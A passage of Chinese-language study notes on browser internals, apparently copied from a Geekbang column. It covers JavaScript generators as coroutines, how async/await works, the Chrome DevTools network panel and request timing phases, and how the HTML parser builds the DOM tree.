关键字，那么 JavaScript 引擎会结束当前协程，并将 return 后面的内容返回给父协程。</li></ol><p>不过，对于上面这段代码，你可能又有这样疑问：父协程有自己的调用栈，gen 协程时也有自己的调用栈，当 gen 协程通过 yield 把控制权交给父协程时，V8 是如何切换到父协程的调用栈？当父协程通过 gen.next 恢复 gen 协程时，又是如何切换 gen 协程的调用栈？</p><p>要搞清楚上面的问题，你需要关注以下两点内容。</p><p>第一点：gen 协程和父协程是在主线程上交互执行的，并不是并发执行的，它们之前的切换是通过 yield 和 gen.next 来配合完成的。</p><p>第二点：当在 gen 协程中调用了 yield 方法时，JavaScript 引擎会保存 gen 协程当前的调用栈信息，并恢复父协程的调用栈信息。同样，当在父协程中执行 gen.next 时，JavaScript 引擎会保存父协程的调用栈信息，并恢复 gen 协程的调用栈信息。</p><p>为了直观理解父协程和 gen 协程是如何切换调用栈的，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221736423.png" alt="image-20221014221736423"></p><p>到这里相信你已经弄清楚了协程是怎么工作的，其实在 JavaScript 中，生成器就是协程的一种实现方式，这样相信你也就理解什么是生成器了。那么接下来，我们使用生成器和 Promise 来改造开头的那段 Promise 代码。改造后的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//foo 函数</span><br><span class="line">function* foo() &#123;</span><br><span class="line">    let response1 = yield fetch(&#x27;https://www.geekbang.org&#x27;)</span><br><span class="line">    console.log(&#x27;response1&#x27;)</span><br><span class="line">    console.log(response1)</span><br><span class="line">    let response2 = yield fetch(&#x27;https://www.geekbang.org/test&#x27;)</span><br><span class="line">    console.log(&#x27;response2&#x27;)</span><br><span class="line">    console.log(response2)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 执行 foo 函数的代码</span><br><span class="line">let gen = foo()</span><br><span class="line">function getGenPromise(gen) &#123;</span><br><span class="line">    return gen.next().value</span><br><span class="line">&#125;</span><br><span class="line">getGenPromise(gen).then((response) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;response1&#x27;)</span><br><span class="line">    console.log(response)</span><br><span class="line">    return getGenPromise(gen)</span><br><span class="line">&#125;).then((response) =&gt; &#123;</span><br><span class="line">    console.log(&#x27;response2&#x27;)</span><br><span class="line">    console.log(response)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>从图中可以看到，foo 函数是一个生成器函数，在 foo 函数里面实现了用同步代码形式来实现异步操作；但是在 foo 函数外部，我们还需要写一段执行 foo 函数的代码，如上述代码的后半部分所示，那下面我们就来分析下这段代码是如何工作的。</p><ul><li>首先执行的是<code>let gen = foo()</code>，创建了 gen 协程。</li><li>然后在父协程中通过执行 gen.next 把主线程的控制权交给 gen 协程。</li><li>gen 协程获取到主线程的控制权后，就调用 fetch 函数创建了一个 Promise 对象 response1，然后通过 yield 暂停 gen 协程的执行，并将 response1 返回给父协程。</li><li>父协程恢复执行后，调用 response1.then 方法等待请求结果。</li><li>等通过 fetch 发起的请求完成之后，会调用 then 中的回调函数，then 中的回调函数拿到结果之后，通过调用 gen.next 放弃主线程的控制权，将控制权交 gen 协程继续执行下个请求。</li></ul><p>以上就是协程和 Promise 相互配合执行的一个大致流程。不过通常，我们把执行生成器的代码封装成一个函数，并把这个执行生成器代码的函数称为<strong>执行器</strong>（可参考著名的 co 框架），如下面这种方式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function* foo() &#123;</span><br><span class="line">    let response1 = yield fetch(&#x27;https://www.geekbang.org&#x27;)</span><br><span class="line">    console.log(&#x27;response1&#x27;)</span><br><span class="line">    console.log(response1)</span><br><span class="line">    let response2 = yield fetch(&#x27;https://www.geekbang.org/test&#x27;)</span><br><span class="line">    console.log(&#x27;response2&#x27;)</span><br><span class="line">    console.log(response2)</span><br><span class="line">&#125;</span><br><span class="line">co(foo());</span><br></pre></td></tr></table></figure><p>通过使用生成器配合执行器，就能实现使用同步的方式写出异步代码了，这样也大大加强了代码的可读性。</p><h3 id="async-x2F-await"><a href="#async-x2F-await" class="headerlink" title="async&#x2F;await"></a>async&#x2F;await</h3><p>虽然生成器已经能很好地满足我们的需求了，但是程序员的追求是无止境的，这不又在 ES7 中引入了 async&#x2F;await，这种方式能够彻底告别执行器和生成器，实现更加直观简洁的代码。其实 async&#x2F;await 技术背后的秘密就是 Promise 和生成器应用，往低层说就是微任务和协程应用。要搞清楚 async 和 await 的工作原理，我们就得对 async 和 await 分开分析。</p><h4 id="1-async"><a href="#1-async" class="headerlink" title="1. async"></a>1. async</h4><p>我们先来看看 async 到底是什么？根据 MDN 定义，async 是一个通过<strong>异步执行</strong>并<strong>隐式返回 Promise</strong> 作为结果的函数。</p><p>对 async 函数的理解，这里需要重点关注两个词：<strong>异步执行</strong>和<strong>隐式返回 Promise</strong>。</p><p>关于异步执行的原因，我们一会儿再分析。这里我们先来看看是如何隐式返回 Promise 的，你可以参考下面的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async function foo() &#123;</span><br><span class="line">    return 2</span><br><span class="line">&#125;</span><br><span class="line">console.log(foo())  // Promise &#123;&lt;resolved&gt;: 2&#125;</span><br></pre></td></tr></table></figure><p>执行这段代码，我们可以看到调用 async 声明的 foo 函数返回了一个 Promise 对象，状态是 resolved，返回结果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Promise &#123;&lt;resolved&gt;: 2&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><h4 id="2-await"><a href="#2-await" class="headerlink" title="2. await"></a>2. await</h4><p>我们知道了 async 函数返回的是一个 Promise 对象，那下面我们再结合文中这段代码来看看 await 到底是什么。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">async function foo() &#123;</span><br><span class="line">    console.log(1)</span><br><span class="line">    let a = await 100</span><br><span class="line">    console.log(a)</span><br><span class="line">    console.log(2)</span><br><span class="line">&#125;</span><br><span class="line">console.log(0)</span><br><span class="line">foo()</span><br><span class="line">console.log(3)</span><br></pre></td></tr></table></figure><p>观察上面这段代码，你能判断出打印出来的内容是什么吗？这得先来分析 async 结合 await 到底会发生什么。在详细介绍之前，我们先站在协程的视角来看看这段代码的整体执行流程图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014221750037.png" alt="image-20221014221750037"></p><p>结合上图，我们来一起分析下 async&#x2F;await 的执行流程。</p><p>首先，执行<code>console.log(0)</code>这个语句，打印出来 0。</p><p>紧接着就是执行 foo 函数，由于 foo 函数是被 async 标记过的，所以当进入该函数的时候，JavaScript 引擎会保存当前的调用栈等信息，然后执行 foo 函数中的<code>console.log(1)</code>语句，并打印出 1。</p><p>接下来就执行到 foo 函数中的<code>await 100</code>这个语句了，这里是我们分析的重点，因为在执行<code>await 100</code>这个语句时，JavaScript 引擎在背后为我们默默做了太多的事情，那么下面我们就把这个语句拆开，来看看 JavaScript 到底都做了哪些事情。</p><p>当执行到<code>await 100</code>时，会默认创建一个 Promise 对象，代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let promise_ = new Promise((resolve,reject)&#123;</span><br><span class="line">  resolve(100)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这个 promise_ 对象创建的过程中，我们可以看到在 executor 函数中调用了 resolve 函数，JavaScript 引擎会将该任务提交给微任务队列（<a href="https://time.geekbang.org/column/article/136895">上一篇文章</a>中我们讲解过）。</p><p>然后 JavaScript 引擎会暂停当前协程的执行，将主线程的控制权转交给父协程执行，同时会将 promise_ 对象返回给父协程。</p><p>主线程的控制权已经交给父协程了，这时候父协程要做的一件事是调用 promise_.then 来监控 promise 状态的改变。</p><p>接下来继续执行父协程的流程，这里我们执行<code>console.log(3)</code>，并打印出来 3。随后父协程将执行结束，在结束之前，会进入微任务的检查点，然后执行微任务队列，微任务队列中有<code>resolve(100)</code>的任务等待执行，执行到这里的时候，会触发 promise_.then 中的回调函数，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">promise_.then((value)=&gt;&#123;</span><br><span class="line">   // 回调函数被激活后</span><br><span class="line">  // 将主线程控制权交给 foo 协程，并将 vaule 值传给协程</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>该回调函数被激活以后，会将主线程的控制权交给 foo 函数的协程，并同时将 value 值传给该协程。</p><p>foo 协程激活之后，会把刚才的 value 值赋给了变量 a，然后 foo 协程继续执行后续语句，执行完成之后，将控制权归还给父协程。</p><p>以上就是 await&#x2F;async 的执行流程。正是因为 async 和 await 在背后为我们做了大量的工作，所以我们才能用同步的方式写出异步代码来。</p><h3 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下今天的主要内容。</p><p>Promise 的编程模型依然充斥着大量的 then 方法，虽然解决了回调地狱的问题，但是在语义方面依然存在缺陷，代码中充斥着大量的 then 函数，这就是 async&#x2F;await 出现的原因。</p><p>使用 async&#x2F;await 可以实现用同步代码的风格来编写异步代码，这是因为 async&#x2F;await 的基础技术使用了生成器和 Promise，生成器是协程的实现，利用生成器能实现生成器函数的暂停和恢复。</p><p>另外，V8 引擎还为 async&#x2F;await 做了大量的语法层面包装，所以了解隐藏在背后的代码有助于加深你对 async&#x2F;await 的理解。</p><p>async&#x2F;await 无疑是异步编程领域非常大的一个革新，也是未来的一个主流的编程风格。其实，除了 JavaScript，Python、Dart、C# 等语言也都引入了 async&#x2F;await，使用它不仅能让代码更加整洁美观，而且还能确保该函数始终都能返回 Promise。</p><h1 id="五、浏览器中的页面"><a href="#五、浏览器中的页面" class="headerlink" title="五、浏览器中的页面"></a>五、浏览器中的页面</h1><h2 id="1-Chrome-开发者工具：利用网络面板做性能分析"><a href="#1-Chrome-开发者工具：利用网络面板做性能分析" class="headerlink" title="1. Chrome 开发者工具：利用网络面板做性能分析"></a>1. Chrome 开发者工具：利用网络面板做性能分析</h2><p>浏览器中的页面循环系统”模块我们已经介绍完了，循环系统是页面的基础，理解了循环系统能让我们从本质上更好地理解页面的工作方式，加深我们对一些前端概念的理解。</p><p>接下来我们就要进入新的模块了，也就是“浏览器中的页面”模块，正如专栏简介中所言，页面是浏览器的核心，浏览器中的所有功能点都是服务于页面的，而 Chrome 开发者工具又是工程师调试页面的核心工具，所以在这个模块的开篇，我想先带你来深入了解下 Chrome 开发者工具。</p><p><strong>Chrome 开发者工具（简称 DevTools）是一组网页制作和调试的工具，内嵌于 Google Chrome 浏览器中</strong>。Chrome 开发者工具非常重要，所蕴含的内容也是非常多的，熟练使用它能让你更加深入地了解浏览器内部工作原理。（Chrome 开发者工具也在不停地迭代改进，如果你想使用最新版本，可以使用<a href="https://www.google.com/intl/en/chrome/canary/">Chrome Canary</a>。）</p><p>作为这一模块的第一篇文章，我们主要聚焦<strong>页面的源头</strong>和<strong>网络数据的接收</strong>，这些发送和接收的数据都能体现在开发者工具的网络面板上。不过为了你能更好地理解和掌握，我们会先对 Chrome 开发者工具做一个大致的介绍，然后再深入剖析网络面板。</p><h2 id="Chrome-开发者工具"><a href="#Chrome-开发者工具" class="headerlink" title="Chrome 开发者工具"></a>Chrome 开发者工具</h2><p>Chrome 开发者工具有很多重要的面板，比如与性能相关的有网络面板、Performance 面板、内存面板等，与调试页面相关的有 Elements 面板、Sources 面板、Console 面板等。</p><p>你可以在浏览器窗口的右上方选择 Chrome 菜单，然后选择“更多工具–&gt; 开发者工具”来打开 Chrome 开发者工具。打开的页面如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222236892.png" alt="image-20221014222236892"></p><p>从图中可以看出，它一共包含了 10 个功能面板，包括了 Elements、Console、Sources、NetWork、Performance、Memory、Application、Security、Audits 和 Layers。</p><p>关于这 10 个面板的大致功能，我做了一个表格，感兴趣的话，你可以详细看下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222248032.png" alt="image-20221014222248032"></p><p>简单来说，Chrome 开发者工具为我们提供了通过界面访问或者编辑 DOM 和 CSSOM 的能力，还提供了强大的调试功能和查看性能指标的能力。</p><p>OK，接下来我们就要重点看下其中重要的 Network 面板，即网络面板。</p><h2 id="网络面板"><a href="#网络面板" class="headerlink" title="网络面板"></a>网络面板</h2><p>网络面板由控制器、过滤器、抓图信息、时间线、详细列表和下载信息概要这 6 个区域构成（如下图所示）。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222258785.png" alt="image-20221014222258785"></p><h3 id="1-控制器"><a href="#1-控制器" class="headerlink" title="1. 控制器"></a>1. 控制器</h3><p>其中，控制器有 4 个比较重要的功能，我们按照下文中的这张图来简单介绍下。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222310398.png" alt="image-20221014222310398"></p><ul><li>红色圆点的按钮，表示“开始 &#x2F; 暂停抓包”，这个功能很常见，很容易理解。</li><li>“全局搜索”按钮，这个功能就非常重要了，可以在所有下载资源中搜索相关内容，还可以快速定位到某几个你想要的文件上。</li><li>Disable cache，即“禁止从 Cache 中加载资源”的功能，它在调试 Web 应用的时候非常有用，因为开启了 Cache 会影响到网络性能测试的结果。</li><li>Online 按钮，是“模拟 2G&#x2F;3G”功能，它可以限制带宽，模拟弱网情况下页面的展现情况，然后你就可以根据实际展示情况来动态调整策略，以便让 Web 应用更加适用于这些弱网。</li></ul><h3 id="2-过滤器"><a href="#2-过滤器" class="headerlink" title="2. 过滤器"></a>2. 过滤器</h3><p>网络面板中的过滤器，主要就是起过滤功能。因为有时候一个页面有太多内容在详细列表区域中展示了，而你可能只想查看 JavaScript 文件或者 CSS 文件，这时候就可以通过过滤器模块来筛选你想要的文件类型。</p><h3 id="3-抓图信息"><a href="#3-抓图信息" class="headerlink" title="3. 抓图信息"></a>3. 抓图信息</h3><p>抓图信息区域，可以用来分析用户等待页面加载时间内所看到的内容，分析用户实际的体验情况。比如，如果页面加载 1 秒多之后屏幕截图还是白屏状态，这时候就需要分析是网络还是代码的问题了。（勾选面板上的“Capture screenshots”即可启用屏幕截图。）</p><h3 id="4-时间线"><a href="#4-时间线" class="headerlink" title="4. 时间线"></a>4. 时间线</h3><p>时间线，主要用来展示 HTTP、HTTPS、WebSocket 加载的状态和时间的一个关系，用于直观感受页面的加载过程。如果是多条竖线堆叠在一起，那说明这些资源被同时被加载。至于具体到每个文件的加载信息，还需要用到下面要讲的详细列表。</p><h3 id="5-详细列表"><a href="#5-详细列表" class="headerlink" title="5. 详细列表"></a>5. 详细列表</h3><p>这个区域是最重要的，它详细记录了每个资源从发起请求到完成请求这中间所有过程的状态，以及最终请求完成的数据信息。通过该列表，你就能很容易地去诊断一些网络问题。</p><p>详细列表是我们本篇文章介绍的重点，不过内容比较多，所以放到最后去专门介绍了。</p><h3 id="6-下载信息概要"><a href="#6-下载信息概要" class="headerlink" title="6. 下载信息概要"></a>6. 下载信息概要</h3><p>下载信息概要中，你要重点关注下 DOMContentLoaded 和 Load 两个事件，以及这两个事件的完成时间。</p><ul><li>DOMContentLoaded，这个事件发生后，说明页面已经构建好 DOM 了，这意味着构建 DOM 所需要的 HTML 文件、JavaScript 文件、CSS 文件都已经下载完成了。</li><li>Load，说明浏览器已经加载了所有的资源（图像、样式表等）。</li></ul><p>通过下载信息概要面板，你可以查看触发这两个事件所花费的时间。</p><h2 id="网络面板中的详细列表"><a href="#网络面板中的详细列表" class="headerlink" title="网络面板中的详细列表"></a>网络面板中的详细列表</h2><p>下面我们就来重点介绍网络面板中的详细列表，这里面包含了大量有用的信息。</p><h3 id="1-列表的属性"><a href="#1-列表的属性" class="headerlink" title="1. 列表的属性"></a>1. 列表的属性</h3><p>列表的属性比较多，比如 Name、Status、Type、Initiator 等等，这个不难理解。当然，你还可以通过点击右键的下拉菜单来添加其他属性，这里我就不再赘述了，你可以自己上手实操一下。</p><p>另外，你也可以按照列表的属性来给列表排序，默认情况下，列表是按请求发起的时间来排序的，最早发起请求的资源在顶部。当然也可以按照返回状态码、请求类型、请求时长、内容大小等基础属性排序，只需点击相应属性即可。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222322142.png" alt="image-20221014222322142"></p><h3 id="2-详细信息"><a href="#2-详细信息" class="headerlink" title="2. 详细信息"></a>2. 详细信息</h3><p>如果你选中详细列表中的一项，右边就会出现该项的详细信息，如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222336212.png" alt="image-20221014222336212"></p><p>你可以在此查看请求列表中任意一项的请求行和请求头信息，还可以查看响应行、响应头和响应体。然后你可以根据这些查看的信息来判断你的业务逻辑是否正确，或者有时候也可以用来逆向推导别人网站的业务逻辑。</p><h3 id="3-单个资源的时间线"><a href="#3-单个资源的时间线" class="headerlink" title="3. 单个资源的时间线"></a>3. 单个资源的时间线</h3><p>了解了每个资源的详细请求信息之后，我们再来分析单个资源请求时间线，这就涉及具体的 HTTP 请求流程了。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222414460.png" alt="image-20221014222414460"></p><p>我们再回顾下在<a href="https://time.geekbang.org/column/article/116588">《03 | HTTP 请求流程：为什么很多站点第二次打开速度会很快？》</a>这篇文章，我们介绍过发起一个 HTTP 请求之后，浏览器首先查找缓存，如果缓存没有命中，那么继续发起 DNS 请求获取 IP 地址，然后利用 IP 地址和服务器端建立 TCP 连接，再发送 HTTP 请求，等待服务器响应；不过，如果服务器响应头中包含了重定向的信息，那么整个流程就需要重新再走一遍。这就是在浏览器中一个 HTTP 请求的基础流程。</p><p>那详细列表中是如何表示出这个流程的呢？这就要重点看下时间线面板了：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222425280.png" alt="image-20221014222425280"></p><p>那面板中这各项到底是什么含义呢？</p><p><strong>第一个是 Queuing</strong>，也就是排队的意思，当浏览器发起一个请求的时候，会有很多原因导致该请求不能被立即执行，而是需要排队等待。导致请求处于排队状态的原因有很多。</p><ul><li>首先，页面中的资源是有优先级的，比如 CSS、HTML、JavaScript 等都是页面中的核心文件，所以优先级最高；而图片、视频、音频这类资源就不是核心资源，优先级就比较低。通常当后者遇到前者时，就需要“让路”，进入待排队状态。</li><li>其次，我们前面也提到过，浏览器会为每个域名最多维护 6 个 TCP 连接，如果发起一个 HTTP 请求时，这 6 个 TCP 连接都处于忙碌状态，那么这个请求就会处于排队状态。</li><li>最后，网络进程在为数据分配磁盘空间时，新的 HTTP 请求也需要短暂地等待磁盘分配结束。</li></ul><p>等待排队完成之后，就要进入发起连接的状态了。不过在发起连接之前，还有一些原因可能导致连接过程被推迟，这个推迟就表现在面板中的<strong>Stalled</strong>上，它表示停滞的意思。</p><p>这里需要额外说明的是，如果你使用了代理服务器，还会增加一个<strong>Proxy Negotiation</strong>阶段，也就是代理协商阶段，它表示代理服务器连接协商所用的时间，不过在上图中没有体现出来，因为这里我们没有使用代理服务器。</p><p>接下来，就到了<strong>Initial connection&#x2F;SSL 阶段</strong>了，也就是和服务器建立连接的阶段，这包括了建立 TCP 连接所花费的时间；不过如果你使用了 HTTPS 协议，那么还需要一个额外的 SSL 握手时间，这个过程主要是用来协商一些加密信息的。（关于 SSL 协商的详细过程，我们会在 Web 安全模块中介绍。）</p><p>和服务器建立好连接之后，网络进程会准备请求数据，并将其发送给网络，这就是<strong>Request sent 阶段</strong>。通常这个阶段非常快，因为只需要把浏览器缓冲区的数据发送出去就结束了，并不需要判断服务器是否接收到了，所以这个时间通常不到 1 毫秒。</p><p>数据发送出去了，接下来就是等待接收服务器第一个字节的数据，这个阶段称为 Waiting (TTFB)，通常也称为“<strong>第一字节时间</strong>”。 TTFB 是反映服务端响应速度的重要指标，对服务器来说，TTFB 时间越短，就说明服务器响应越快。</p><p>接收到第一个字节之后，进入陆续接收完整数据的阶段，也就是<strong>Content Download 阶段</strong>，这意味着从第一字节时间到接收到全部响应数据所用的时间。</p><h2 id="优化时间线上耗时项"><a href="#优化时间线上耗时项" class="headerlink" title="优化时间线上耗时项"></a>优化时间线上耗时项</h2><p>了解了时间线面板上的各项含义之后，我们就可以根据这个请求的时间线来实现相关的优化操作了。</p><h3 id="1-排队（Queuing）时间过久"><a href="#1-排队（Queuing）时间过久" class="headerlink" title="1. 排队（Queuing）时间过久"></a>1. 排队（Queuing）时间过久</h3><p>排队时间过久，大概率是由浏览器为每个域名最多维护 6 个连接导致的。那么基于这个原因，你就可以让 1 个站点下面的资源放在多个域名下面，比如放到 3 个域名下面，这样就可以同时支持 18 个连接了，这种方案称为<strong>域名分片</strong>技术。除了域名分片技术外，我个人还建议你<strong>把站点升级到 HTTP2</strong>，因为 HTTP2 已经没有每个域名最多维护 6 个 TCP 连接的限制了。</p><h3 id="2-第一字节时间（TTFB）时间过久"><a href="#2-第一字节时间（TTFB）时间过久" class="headerlink" title="2. 第一字节时间（TTFB）时间过久"></a>2. 第一字节时间（TTFB）时间过久</h3><p>这可能的原因有如下：</p><ul><li><strong>服务器生成页面数据的时间过久</strong>。对于动态网页来说，服务器收到用户打开一个页面的请求时，首先要从数据库中读取该页面需要的数据，然后把这些数据传入到模板中，模板渲染后，再返回给用户。服务器在处理这个数据的过程中，可能某个环节会出问题。</li><li><strong>网络的原因</strong>。比如使用了低带宽的服务器，或者本来用的是电信的服务器，可联通的网络用户要来访问你的服务器，这样也会拖慢网速。</li><li><strong>发送请求头时带上了多余的用户信息</strong>。比如一些不必要的 Cookie 信息，服务器接收到这些 Cookie 信息之后可能需要对每一项都做处理，这样就加大了服务器的处理时长。</li></ul><p>对于这三种问题，你要有针对性地出一些解决方案。面对第一种服务器的问题，你可以想办法去提高服务器的处理速度，比如通过增加各种缓存的技术；针对第二种网络问题，你可以使用 CDN 来缓存一些静态文件；至于第三种，你在发送请求时就去尽可能地减少一些不必要的 Cookie 数据信息。</p><h3 id="3-Content-Download-时间过久"><a href="#3-Content-Download-时间过久" class="headerlink" title="3. Content Download 时间过久"></a>3. Content Download 时间过久</h3><p>如果单个请求的 Content Download 花费了大量时间，有可能是字节数太多的原因导致的。这时候你就需要减少文件大小，比如压缩、去掉源码中不必要的注释等方法。</p><h2 id="总结-20"><a href="#总结-20" class="headerlink" title="总结"></a>总结</h2><p>好了，今天就介绍到这里了，下面我来总结下今天的内容。</p><p>首先我们简单介绍了 Chrome 开发者工具 10 个基础的面板信息；然后重点剖析了网络面板，再结合之前介绍的网络请求流程来重点分析了网络面板中时间线的各个指标的含义；最后我们还简要分析了时间线中各项指标出现异常的可能原因，并给出了一些优化方案。</p><p>其实通过今天的分析，我们可以得出这样一个结论：如果你要去做一些实践性的项目优化，理解其背后的理论至关重要。因为理论就是一条“线”，它会把各种实践的内容“串”在一起，然后你可以围绕着这条“线”来排查问题。</p><h2 id="2-DOM-树：JavaScript-是如何影响-DOM-树构建的？"><a href="#2-DOM-树：JavaScript-是如何影响-DOM-树构建的？" class="headerlink" title="2. DOM 树：JavaScript 是如何影响 DOM 树构建的？"></a>2. DOM 树：JavaScript 是如何影响 DOM 树构建的？</h2><p>在<a href="https://time.geekbang.org/column/article/138844">上一篇文章</a>中，我们通过开发者工具中的网络面板，介绍了网络请求过程的几种<strong>性能指标</strong>以及对页面加载的影响。</p><p>而在渲染流水线中，后面的步骤都直接或者间接地依赖于 DOM 结构，所以本文我们就继续沿着网络数据流路径来<strong>介绍 DOM 树是怎么生成的</strong>。然后再基于 DOM 树的解析流程介绍两块内容：第一个是在解析过程中遇到 JavaScript 脚本，DOM 解析器是如何处理的？第二个是 DOM 解析器是如何处理跨站点资源的？</p><h3 id="什么是-DOM"><a href="#什么是-DOM" class="headerlink" title="什么是 DOM"></a>什么是 DOM</h3><p>从网络传给渲染引擎的 HTML 文件字节流是无法直接被渲染引擎理解的，所以要将其转化为渲染引擎能够理解的内部结构，这个结构就是 DOM。DOM 提供了对 HTML 文档结构化的表述。在渲染引擎中，DOM 有三个层面的作用。</p><ul><li>从页面的视角来看，DOM 是生成页面的基础数据结构。</li><li>从 JavaScript 脚本视角来看，DOM 提供给 JavaScript 脚本操作的接口，通过这套接口，JavaScript 可以对 DOM 结构进行访问，从而改变文档的结构、样式和内容。</li><li>从安全视角来看，DOM 是一道安全防护线，一些不安全的内容在 DOM 解析阶段就被拒之门外了。</li></ul><p>简言之，DOM 是表述 HTML 的内部数据结构，它会将 Web 页面和 JavaScript 脚本连接起来，并过滤一些不安全的内容。</p><h3 id="DOM-树如何生成"><a href="#DOM-树如何生成" class="headerlink" title="DOM 树如何生成"></a>DOM 树如何生成</h3><p>在渲染引擎内部，有一个叫<strong>HTML 解析器（HTMLParser）</strong>的模块，它的职责就是负责将 HTML 字节流转换为 DOM 结构。所以这里我们需要先要搞清楚 HTML 解析器是怎么工作的。</p><p>在开始介绍 HTML 解析器之前，我要先解释一个大家在留言区问到过好多次的问题：<strong>HTML 解析器是等整个 HTML 文档加载完成之后开始解析的，还是随着 HTML 文档边加载边解析的？</strong></p><p>在这里我统一解答下，HTML 解析器并不是等整个文档加载完成之后再解析的，而是<strong>网络进程加载了多少数据，HTML 解析器便解析多少数据</strong>。</p><p>那详细的流程是怎样的呢？网络进程接收到响应头之后，会根据响应头中的 content-type 字段来判断文件的类型，比如 content-type 的值是“text&#x2F;html”，那么浏览器就会判断这是一个 HTML 类型的文件，然后为该请求选择或者创建一个渲染进程。渲染进程准备好之后，<strong>网络进程和渲染进程之间会建立一个共享数据的管道</strong>，网络进程接收到数据后就往这个管道里面放，而渲染进程则从管道的另外一端不断地读取数据，并同时将读取的数据“喂”给 HTML 解析器。你可以把这个管道想象成一个“水管”，网络进程接收到的字节流像水一样倒进这个“水管”，而“水管”的另外一端是渲染进程的 HTML 解析器，它会动态接收字节流，并将其解析为 DOM。</p><p>解答完这个问题之后，接下来我们就可以来详细聊聊 DOM 的具体生成流程了。</p><p>前面我们说过代码从网络传输过来是字节流的形式，那么后续字节流是如何转换为 DOM 的呢？你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222457832.png" alt="image-20221014222457832"></p><p>从图中你可以看出，字节流转换为 DOM 需要三个阶段。</p><p><strong>第一个阶段，通过分词器将字节流转换为 Token。</strong></p><p>前面<a href="https://time.geekbang.org/column/article/131887">《14 | 编译器和解释器：V8 是如何执行一段 JavaScript 代码的？》</a>文章中我们介绍过，V8 编译 JavaScript 过程中的第一步是做词法分析，将 JavaScript 先分解为一个个 Token。解析 HTML 也是一样的，需要通过分词器先将字节流转换为一个个 Token，分为 Tag Token 和文本 Token。上述 HTML 代码通过词法分析生成的 Token 如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222509957.png" alt="image-20221014222509957"></p><p>由图可以看出，Tag Token 又分 StartTag 和 EndTag，比如<code>&lt;body&gt;</code>就是 StartTag ，<code>&lt;/body&gt;就是EndTag</code>，分别对于图中的蓝色和红色块，文本 Token 对应的绿色块。</p><p><strong>至于后续的第二个和第三个阶段是同步进行的，需要将 Token 解析为 DOM 节点，并将 DOM 节点添加到 DOM 树中。</strong></p><p>HTML 解析器维护了一个<strong>Token 栈结构</strong>，该 Token 栈主要用来计算节点之间的父子关系，在第一个阶段中生成的 Token 会被按照顺序压到这个栈中。具体的处理规则如下所示：</p><ul><li>如果压入到栈中的是<strong>StartTag Token</strong>，HTML 解析器会为该 Token 创建一个 DOM 节点，然后将该节点加入到 DOM 树中，它的父节点就是栈中相邻的那个元素生成的节点。</li><li>如果分词器解析出来是<strong>文本 Token</strong>，那么会生成一个文本节点，然后将该节点加入到 DOM 树中，文本 Token 是不需要压入到栈中，它的父节点就是当前栈顶 Token 所对应的 DOM 节点。</li><li>如果分词器解析出来的是<strong>EndTag 标签</strong>，比如是 EndTag div，HTML 解析器会查看 Token 栈顶的元素是否是 StarTag div，如果是，就将 StartTag div 从栈中弹出，表示该 div 元素解析完成。</li></ul><p>通过分词器产生的新 Token 就这样不停地压栈和出栈，整个解析过程就这样一直持续下去，直到分词器将所有字节流分词完成。</p><p>为了更加直观地理解整个过程，下面我们结合一段 HTML 代码（如下），来一步步分析 DOM 树的生成过程。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;div&gt;test&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这段代码以字节流的形式传给了 HTML 解析器，经过分词器处理，解析出来的第一个 Token 是 StartTag html，解析出来的 Token 会被压入到栈中，并同时创建一个 html 的 DOM 节点，将其加入到 DOM 树中。</p><p>这里需要补充说明下，<strong>HTML 解析器开始工作时，会默认创建了一个根为 document 的空 DOM 结构</strong>，同时会将一个 StartTag document 的 Token 压入栈底。然后经过分词器解析出来的第一个 StartTag html Token 会被压入到栈中，并创建一个 html 的 DOM 节点，添加到 document 上，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222525525.png" alt="image-20221014222525525"></p><p>然后按照同样的流程解析出来 StartTag body 和 StartTag div，其 Token 栈和 DOM 的状态如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222538186.png" alt="image-20221014222538186"></p><p>接下来解析出来的是第一个 div 的文本 Token，渲染引擎会为该 Token 创建一个文本节点，并将该 Token 添加到 DOM 中，它的父节点就是当前 Token 栈顶元素对应的节点，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222548027.png" 